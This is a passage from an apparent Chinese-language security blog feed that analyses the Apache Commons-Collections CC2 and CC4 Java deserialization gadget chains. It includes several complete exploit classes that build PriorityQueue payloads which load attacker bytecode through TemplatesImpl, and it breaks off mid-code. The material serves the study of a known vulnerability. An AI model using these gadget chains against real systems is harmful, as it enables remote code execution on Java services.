class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformingField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformingField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformingField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501262046666.png" alt="image-20250126200752416"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a class="link" href="https://blog.nbcares.top/archives/CC2">Java_Commons-Collections 2（CC2） 学习过程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://gtl-ju.github.io/2023/09/08/CommonCollections4%E4%B8%8ECommonCollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">CommonCollections4与CommonCollections2利用链分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/">Java反序列化Commons-Collections篇05-CC2链 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
    <summary type="html">false</summary>
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-Commons-Collections 4利用链分析</title>
    <link href="http://example.com/2025/01/26/Java%E5%AE%89%E5%85%A8-Commons-Collections-4%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2025/01/26/Java%E5%AE%89%E5%85%A8-Commons-Collections-4%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2025-01-25T16:15:01.000Z</published>
    <updated>2025-01-25T16:20:03.602Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>不受JDK版本限制，这里还是用<code>8u65</code></p><ul><li>JDK8u65</li><li>openJDK 8u65</li><li>Maven 3.6.3</li><li>Commons-Collections 4.0</li></ul><p>Maven下载Commons-Collections依赖</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>因为还是CC链的漏洞，所以离不开<code>transform</code>方法。</p><p>前面我们已经分析过了CC1、CC6和CC3，链子尾部命令执行的方法就两种，<code>Runtime.exec</code>或者动态加载字节码。</p><p>CC4去掉了<code>InvokerTransformer</code>的<code>Serializable</code>继承，但是命令执行不受影响。</p><p>我们需要再找一个类调用<code>transform</code>方法，这里找的是<code>InstantiateTransformer</code>类，然后继续find usages</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015132.png" alt="image-20250125144433805"></p><p><code>TransformingComparator</code>类</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015343.png" alt="image-20250125144844469"></p><p><code>compare</code>方法调用了<code>transform</code>方法，继续找谁调用了<code>compare</code>方法</p><p><code>java.util.PriorityQueue</code>类的<code>siftDownUsingComparator</code>方法调用了<code>compare</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015123.png" alt="image-20250125150403642"></p><p>然后是同一个类下的<code>siftDown</code>方法调用了<code>siftDownUsingComparator</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015100.png" alt="image-20250125150829659"></p><p>然后是<code>heapify</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015037.png" alt="image-20250125150939852"></p><p>然后是<code>readObject</code></p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015086.png" alt="image-20250125151016612" style="zoom: 67%;"><p>至此我们已经分析完了链子，下面开始写Exp</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015515.png" alt="image-20250125192613777"></p><h2 id="编写Exp"><a href="#编写Exp" class="headerlink" title="编写Exp"></a>编写Exp</h2><p>先编写一个<code>InstantiateTransformer.tansform()</code>的Exp，这里是通过动态加载字节码来命令执行</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Exp1</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    nameField.set(templates,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">    bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="comment">//    templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">    <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">    instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015624.png" alt="image-20250125154634663"></p><p>成功弹出计算器，继续往前到<code>siftDownUsingComparator</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Exp2</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    nameField.set(templates,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">    bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="comment">//    templates.newTransformer();</span></span><br><span class="line">    <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">            instantiateTransformer</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    <span class="comment">//  instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">    serialize(priorityQueue);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015582.png" alt="image-20250125192941424"></p><p>没弹计算器，但是也没报错</p><p>在<code>PriorityQueue</code>的第734行的<code>heapify</code>打个断点</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015815.png" alt="image-20250125193440509"></p><p>直接跳出了，并没有进入<code>siftDown</code></p><p>原因就是这里的<code>size&gt;&gt;&gt;1</code>,<code>&gt;&gt;&gt;</code>是移位符，移位符定义如下</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value &gt;&gt;&gt; num <span class="comment">//value是进行右移的数字，num是指定的移位位数即value向右移动多少位</span></span><br></pre></td></tr></table></figure></div><p>我们再看这个循环条件，<code>i=(size &gt;&gt;&gt;1) -1;i&gt;=0</code>，说明<code>size</code>至少要是2才能进入循环，size就是<code>PriorityQueue</code>这个队列的长度</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015975.png" alt="image-20250125200208405"></p><p>给队列加两个元素</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);  </span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure></div><p>exp</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Exp2</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    nameField.set(templates,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">    bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="comment">//    templates.newTransformer();</span></span><br><span class="line">    <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">            <span 